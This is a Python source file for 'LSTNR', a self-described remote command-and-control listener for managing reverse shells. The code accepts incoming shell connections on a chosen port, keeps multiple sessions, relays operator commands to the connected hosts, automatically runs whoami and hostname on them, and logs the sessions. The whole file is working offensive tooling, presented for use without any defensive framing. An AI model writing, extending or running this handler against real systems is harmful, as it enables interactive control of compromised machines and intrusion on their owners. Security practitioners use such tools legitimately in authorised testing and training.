import select  # Allows checking if sockets have available data to read
import socket  # Provides networking capabilities
import threading  # Enables running multiple tasks simultaneously (multithreading)
import sys  # Gives access to system-specific parameters and functions
import queue  # Implements a FIFO queue, used for handling notifications
import time  # Used for timestamps and delays
import os  # Provides OS-related functions like file handling
#import readline  # Allows command history functionality

# ANSI escape codes for colors
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[38;5;214m"
PINK = "\033[95m"
PURPLE = "\033[35m"
YELLOW = "\033[93m"
BROWN = "\033[33m"
RESET = "\033[0m"  # Reset color back to default


HOST = "0.0.0.0"
PORT = None  # Port will be set from command-line arguments

sessions = {}
session_id = 0
lock = threading.Lock()

notifications = queue.Queue()  # Queue to store new session messages

# Log file path with timestamp
#LOG_FILE = f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log"
LOG_DIR = "logs-lstnr"  # Directory for logs
os.makedirs(LOG_DIR, exist_ok=True)  # Ensure the directory exists

LOG_FILE = os.path.join(LOG_DIR, f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log")


# Initialize logging to a file
def init_log_file():
    """Initialize the log file by writing a header."""
    with open(LOG_FILE, 'w') as log_file:
        log_file.write("LSTNR Log File\n")
        log_file.write("Start Time: {}\n".format(time.ctime()))
        log_file.write("="*50 + "\n")

def log_to_file(message):
    """Log message to the sessions.log file."""
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(message + "\n")

def print_error(error_message):
    """Prints errors in red."""
    message = f"{RED}[!] ERROR: {error_message}{RESET}"
    print(message)
    log_to_file(message)  # Log error to the file

def print_menu():
    """Prints a formal list of available commands."""
    message = f"""{ORANGE}╔════════════════════════════════════════════════════════════╗
║                     AVAILABLE COMMANDS                     ║
╠════════════════════════════════════════════════════════════╣
║ help  | ? - Show this help menu                            ║
║ ls        - List active sessions                           ║
║ cs <id>   - Connect to a specific session by ID            ║
║ bs        - Background the current session                 ║
║ die       - Terminate all sessions                         ║
║ exit      - Terminate the current session or exit LSTNR    ║
╚════════════════════════════════════════════════════════════╝{RESET}"""
    print(message)
    log_to_file("Displayed menu.")

def handle_client(client_socket, addr, session_number):
    """Creates a fully interactive reverse shell with real-time output."""
    print(f"{GREEN}[+] Session {session_number} connected from {addr}{RESET}")
    log_to_file(f"[+] Session {session_number} connected from {addr}")  # Log session start

    stop_event = threading.Event()

    def receive_output():
        """Continuously receive and display output in real-time."""
        try:
            while not stop_event.is_set():
                ready, _, _ = select.select([client_socket], [], [], 0.1)  # Non-blocking wait
                if ready:
                    data = client_socket.recv(4096)
                    if not data:
                        break  # Connection closed
                    sys.stdout.write(data.decode(errors="ignore"))  # Print immediately
                    sys.stdout.flush()

                    # Log the command output
                    log_to_file(data.decode(errors="ignore"))
        except OSError:  # Handle 'Bad file descriptor' error
            pass  
        except Exception as e:
            print_error(f"Receive error: {e}")

    # Start the receive thread
    recv_thread = threading.Thread(target=receive_output, daemon=True)
    recv_thread.start()

    try:
        while True:
            command = sys.stdin.readline().strip()  # Read user input properly

            # Log the user input command
            if command:
                log_to_file(f"Command: {command}")

            if command.lower() == "bs":
                print(f"{ORANGE}[*] Session {session_number} moved to background.{RESET}")
                log_to_file(f"[*] Session {session_number} moved to background.")
                stop_event.set()
                return

            if command.lower() == "die":
                print(f"{ORANGE}[-] Terminating session {session_number}.{RESET}")
                log_to_file(f"[-] Terminating session {session_number}.")
                stop_event.set()  # Stop receiving thread
                recv_thread.join()  # Wait for thread to fully stop
                try:
                    client_socket.sendall(b"exit\n")
                    client_socket.close()
                except OSError:
                    pass  # Ignore socket already closed errors

                with lock:
                    del sessions[session_number]
                return

            client_socket.sendall(command.encode() + b"\n")

    except KeyboardInterrupt:
        print(f"\n{ORANGE}[*] Session {session_number} moved to background.{RESET}")
        log_to_file(f"[*] Session {session_number} moved to background.")
        stop_event.set()
        recv_thread.join()
        return
    except BrokenPipeError:
        print(f"{RED}[-] Session {session_number} disconnected.{RESET}")
        log_to_file(f"[-] Session {session_number} disconnected.")
        stop_event.set()
        recv_thread.join()
        return
    except Exception as e:
        print_error(str(e))

    print(f"{RED}[-] Session {session_number} disconnected.{RESET}")
    log_to_file(f"[-] Session {session_number} disconnected.")  # Log session disconnection
    with lock:
        del sessions[session_number]

def session_manager():
    """Main menu that allows session management."""
    time.sleep(1)  # wait for 1 second before dropping into LSTNR$
    
    while True:
        try:
            while not notifications.empty():
                print(notifications.get())  # Display notifications, like new session messages

            command = input(f"{BLUE}LSTNR$ {RESET}").strip()  # Prompt for command input
            
            # Log the command input
            log_to_file(f"LSTNR$ {command}")
            
            if command == "":
                print_menu()  # Display the menu if the command is empty
            elif command == "help":
                print_menu()  # Show the menu when 'help' is typed
            elif command == "?":
                print_menu()  # Show the menu when '?' is typed
            elif command.lower() == "ls":
                # Display active sessions
                while not notifications.empty():
                    print(notifications.get())

                print(f"{ORANGE}╔════════════════════════════════════════════════════════════╗")
                print(f"║ ID  ║ IP ADDRESS      ║ USER            ║ HOSTNAME         ║")
                print(f"╠════════════════════════════════════════════════════════════╣")
                session_list = ""
                for sid, session in sessions.items():
                    user = session.get("user", "N/A")  # Fetch user info (whoami)
                    hostname = session.get("hostname", "N/A")  # Fetch hostname info
                    session_list += f"║ {sid:<3} ║ {session['addr'][0]:<15} ║ {user:<15} ║ {hostname:<16}  ║\n"
                    print(f"║ {sid:<3} ║ {session['addr'][0]:<15} ║ {user:<15} ║ {hostname:<15} ║")
                print(f"╚════════════════════════════════════════════════════════════╝{RESET}")

                # Log the session table into the file
                log_to_file("Session list displayed:")
                log_to_file("╔════════════════════════════════════════════════════════════╗")
                log_to_file("║ ID  ║ IP ADDRESS      ║ USER            ║ HOSTNAME         ║")
                log_to_file("╠════════════════════════════════════════════════════════════╣")
                log_to_file(session_list)
                log_to_file("╚════════════════════════════════════════════════════════════╝\n")

            elif command.startswith("cs "):
                # Connect to a specific session using session ID
                try:
                    sid = int(command.split()[1])  # Extract session ID
                    if sid in sessions:
                        session = sessions[sid]

                        # Only run `whoami` and `hostname` the first time the session is accessed
                        if not session.get("user_updated", False) or not session.get("hostname_updated", False):
                            # Run whoami and hostname commands
                            session["user_updated"] = True
                            session["hostname_updated"] = True

                            # Get user and hostname
                            client_socket = session['socket']
                            client_socket.sendall(b"whoami\n")
                            user = client_socket.recv(4096).decode(errors="ignore").strip()

                            client_socket.sendall(b"hostname\n")
                            hostname = client_socket.recv(4096).decode(errors="ignore").strip()

                            # Update session with fetched details
                            session["user"] = user
                            session["hostname"] = hostname
                            print(f"{GREEN}[+] Updated user to: {user}, hostname to: {hostname}{RESET}")
                            log_to_file(f"[+] Updated user to: {user}, hostname to: {hostname}")
                        
                        # Proceed with handling the session interactively
                        handle_client(session['socket'], session['addr'], sid)

                    else:
                        print_error("Invalid session ID.")
                except:
                    print_error("Invalid command. Usage: cs <session_id>")

            elif command.lower() == "bs":
                # Background the current session
                print(f"{ORANGE}[*] Session moved to background.{RESET}")
                log_to_file(f"[*] Session moved to background.")
                # Background logic if needed, in this case, nothing specific is handled for 'bs'
                pass

            elif command.lower() == "die":
                # Terminate all sessions
                print(f"{RED}[!] Terminating all sessions.{RESET}")
                log_to_file("[!] Terminating all sessions.")
                with lock:
                    for sid in list(sessions.keys()):
                        sessions[sid]["socket"].send(b"exit\n")
                        sessions[sid]["socket"].close()
                        del sessions[sid]
                print(f"{ORANGE}[+] All sessions terminated.{RESET}")
                log_to_file("[+] All sessions terminated.")

            elif command.lower() == "exit":
                # Shut down the listener and terminate all sessions
                print(f"{RED}[!] Killing all sessions.{RESET}")
                print(f"{ORANGE}[+] Shutting down LSTNR.{RESET}")
                log_to_file("[!] Killing all sessions. Shutting down LSTNR.")
                break  # Exit the listener

            else:
                # Handle unknown commands
                print(f"{RED}[!] Unknown command: {command}{RESET}")
                log_to_file(f"[!] Unknown command: {command}")

        except KeyboardInterrupt:
            print(f"\n{RED}[!] Type 'exit' to close LSTNR.{RESET}")
        except Exception as e:
            print_error(str(e))


def start_listener():
    """Starts the listener and accepts incoming connections."""
    global session_id

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST, PORT))
    except OSError as e:
        print_error(e)
        sys.exit(1)

    server.listen(5)
    print(f""" {PINK}
    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v0.6
    - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
    """)
    print(f"{ORANGE}[*] Listening on {HOST}:{PORT}{RESET}")
    log_to_file(f"[*] Listening on {HOST}:{PORT}")

    while True:
        try:
            client_socket, addr = server.accept()
            with lock:
                session_id += 1
                sessions[session_id] = {"socket": client_socket, "addr": addr}
            notifications.put(f"{GREEN}[+] New connection from {addr}. Assigned Session ID: {session_id}{RESET}")
            log_to_file(f"[+] New connection from {addr}. Assigned Session ID: {session_id}")
        except Exception as e:
            print_error(str(e))

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "-p":
        print_error("Usage: ./lstnr.py -p <port>")
        sys.exit(1)

    try:
        PORT = int(sys.argv[2])
        if PORT < 1 or PORT > 65535:
            raise ValueError
    except ValueError:
        print_error("Invalid port number. Use a port between 1 and 65535.")
        sys.exit(1)

    try:
        init_log_file()  # Initialize the log file with timestamped name
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()

        session_manager()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Exiting... Closing all connections.{RESET}")
        for sid in list(sessions.keys()):
            try:
                sessions[sid]["socket"].send(b"exit\n")
                sessions[sid]["socket"].close()
            except:
                pass
        sys.exit(0)
    except Exception as e:
        print_error(str(e))
                          
